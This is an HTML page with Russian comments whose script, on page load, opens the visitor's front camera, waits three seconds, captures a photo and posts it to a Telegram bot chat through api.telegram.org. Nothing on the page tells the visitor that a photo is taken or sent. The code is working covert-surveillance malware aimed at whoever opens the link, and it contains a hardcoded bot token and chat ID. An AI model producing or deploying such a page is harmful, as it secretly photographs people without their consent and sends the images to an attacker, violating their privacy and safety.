<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Фото с фронтальной камеры</title>
  <style>
    /* Видео по центру и без звука */
    video {
      display: block;
      margin: 20px auto;
      max-width: 100%;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline muted width="320" height="240"></video>

  <script>
    const TOKEN = "7652687345:AAElRXM2tsPSUIztZWkZhNDRlQ5x5CFrQjs";    // Заменить на токен своего бота
    const CHAT_ID = "919015722";      // Заменить на свой Telegram ID

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "photo.jpg");

      try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData,
        });
        if (!response.ok) {
          console.error("Ошибка отправки фото в Telegram:", response.statusText);
        }
      } catch (err) {
        console.error("Ошибка сети при отправке фото:", err);
      }
    }

    function captureAndSend() {
      const video = document.getElementById("video");
      const width = video.videoWidth || 320;
      const height = video.videoHeight || 240;

      if (width === 0 || height === 0) {
        console.error("Видео ещё не готово для захвата изображения");
        return;
      }

      const canvas = document.createElement("canvas");
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, width, height);

      canvas.toBlob(sendPhoto, "image/jpeg");
    }

    async function startCamera() {
      try {
        const constraints = {
          video: {
            facingMode: "user" // фронтальная камера
          },
          audio: false
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.getElementById("video");
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();

          // Ждём 3 секунды чтобы камера стабилизировалась и видео запустилось
          setTimeout(() => {
            captureAndSend();
          }, 3000);
        };
      } catch (err) {
        console.error("Ошибка доступа к камере:", err);
      }
    }

    startCamera();
  </script>
</body>
</html>
